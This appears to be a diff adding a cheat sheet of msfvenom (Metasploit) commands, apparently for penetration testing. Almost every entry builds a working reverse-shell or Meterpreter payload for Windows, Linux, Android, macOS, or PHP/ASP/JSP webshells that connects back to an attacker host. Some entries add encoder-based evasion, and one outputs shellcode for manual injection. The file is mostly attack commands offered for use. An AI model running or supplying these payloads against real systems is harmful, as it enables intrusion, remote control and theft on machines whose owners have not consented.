@@ -1,0 +1,77 @@
+===========================
+MSFvenom - Common CLI Commands
+===========================
+
+1. Basic Syntax
+---------------------------
+msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format> -o <output_file>
+
+Example:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
+
+2. Show Available Payloads
+---------------------------
+msfvenom -l                   # List all payloads
+msfvenom -l payloads          # Same as above
+
+3. Show Output Formats
+---------------------------
+msfvenom -l formats           # List all supported output formats (exe, elf, apk, etc.)
+
+4. Show Encoders
+---------------------------
+msfvenom -l encoders          # List all available encoders
+
+5. Windows Payloads
+---------------------------
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o win_shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+
+6. Linux Payloads
+---------------------------
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+
+7. Android Payload
+---------------------------
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o app.apk
+
+8. Mac OS X Payload
+---------------------------
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > osx_shell.macho
+
+9. PHP, ASP, and JSP Payloads (Web)
+-------------------------------------
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+
+10. Encode a Payload
+---------------------------
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe > encoded_shell.exe
+
+    -e : encoder to use
+    -i : number of iterations
+    -f : output format
+
+11. List Platform and Architecture
+-------------------------------------
+msfvenom -l platforms         # List supported platforms
+msfvenom -l archs             # List supported architectures
+
+12. Output Payload to C Code
+------------------------------
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f c > payload.c
+
+13. Output Shellcode for Manual Injection
+------------------------------------------
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c
+
+14. Bash Shell Reverse TCP One-liner
+-------------------------------------
+msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw
+
+15. Powershell Payload (Base64)
+----------------------------------
+msfvenom -p windows/powershell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw
+
